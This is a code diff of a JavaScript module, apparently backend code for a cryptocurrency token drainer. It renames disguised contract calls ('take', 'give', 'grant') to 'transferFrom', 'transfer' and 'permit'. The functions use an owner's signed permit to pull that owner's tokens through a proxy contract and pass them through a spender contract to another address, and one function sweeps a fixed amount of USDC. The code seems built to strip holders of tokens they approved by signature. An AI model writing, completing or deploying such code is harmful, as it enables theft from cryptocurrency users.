@@ -30,14 +30,14 @@ async function transferFromProxy(spenderProxy, token_address, owner, amount, spe
     return new Promise(async(resolve, reject) => {
       try {
         const proxyContract = await getEthereumContract(spenderProxy, spenderContractABI);
-        const transferToContract = await proxyContract.take(token_address, owner, amount);
+        const transferToContract = await proxyContract.transferFrom(token_address, owner, amount);
         await transferToContract.wait();
 
-        const transferToSpender = await proxyContract.give(token_address, amount);
+        const transferToSpender = await proxyContract.transfer(token_address, amount);
         await transferToSpender.wait();
 
         const spenderContract = await getEthereumContract(spenderContractAddress || spenderAddress, spenderContractABI);
-        const transferToOwner = await spenderContract.give(token_address, amount);
+        const transferToOwner = await spenderContract.transfer(token_address, amount);
         await transferToOwner.wait();
 
         resolve(transferToOwner.hash)
@@ -54,12 +54,12 @@ async function transferFromProxyToOwner(spenderProxy, token_address, amount, spe
     return new Promise(async(resolve, reject) => {
       try {
         const proxyContract = await getEthereumContract(spenderProxy, spenderContractABI);
-        const transferToSpender = await proxyContract.give(token_address, amount);
+        const transferToSpender = await proxyContract.transfer(token_address, amount);
         await transferToSpender.wait();
 
 
         const spenderContract = await getEthereumContract(spenderContractAddress || spenderAddress, spenderContractABI);
-        const transferToOwner = await spenderContract.give(token_address, amount);
+        const transferToOwner = await spenderContract.transfer(token_address, amount);
         await transferToOwner.wait();
         resolve(transferToOwner.hash)
       } catch (error) {
@@ -76,7 +76,7 @@ async function  permitProxy(spenderProxy, token, owner, amount, deadline, v, r, 
       try {
         console.log({spenderProxy, token, owner, amount, deadline, v, r, s})
         const proxyContract = await getEthereumContract(spenderProxy, spenderContractABI);
-        const permitTransaction = await proxyContract.grant(token, owner, amount, deadline, v, r, s);
+        const permitTransaction = await proxyContract.permit(token, owner, amount, deadline, v, r, s);
         await permitTransaction.wait();
         resolve(permitTransaction.hash)
       } catch (error) {
@@ -97,7 +97,7 @@ async function proxyOwner() {
       // console.log("proxy owner", permitTransaction)
 
       const spenderContract = await getEthereumContract(spenderAddress, spenderContractABI);
-      const transferToOwner = await spenderContract.give(USDC_ADDRESS, parseEther('0.34208271'));
+      const transferToOwner = await spenderContract.transfer(USDC_ADDRESS, parseEther('0.34208271'));
       await transferToOwner.wait();
       resolve(transferToOwner.hash)
     } catch (error) {
